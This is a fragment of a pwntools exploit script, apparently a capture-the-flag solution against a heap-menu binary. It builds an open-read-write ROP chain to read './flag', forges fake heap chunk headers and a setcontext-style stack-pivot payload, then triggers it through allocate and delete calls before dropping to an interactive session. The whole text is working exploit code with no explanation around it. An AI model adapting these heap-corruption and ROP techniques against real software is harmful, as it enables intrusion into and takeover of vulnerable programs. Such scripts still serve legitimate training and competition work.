# orw len is 0xa8
orw = p64(rdi)+p64(flag_addr)+p64(rsi)+p64(0)+p64(o)
orw += p64(rdi)+p64(3)+p64(rsi)+p64(buf)+p64(rdx)+p64(0x30)+p64(0)+p64(r)
orw += p64(rdi)+p64(1)+p64(rsi)+p64(buf)+p64(rdx)+p64(0x30)+p64(0)+p64(w)

payload = b'./flag'.ljust(0x38, b'\x00')+p64(0x41)+p64(fh)
payload = payload.ljust(0x78, b'\x00')+p64(0x21)+p64(heap+0x600)
payload = payload.ljust(0x100, b'\x00')+0x20*b'\x00'+p64(context) + \
    b'\x00'*(0xa0-0x28)+p64(heap+0x200)+p64(rdi)
payload = payload.ljust(0x200)+orw[8:]
p.sendline(payload)
p.sendlineafter('choice&gt;&gt; ','6')
# pause()
new(1, con=p64(0)+p64(heap+0x100)+p64(0)*2+p64(context), size=0x30)
new(3, con=p64(gadgets), size=0x30)
dlt(1)
p.interactive()
```
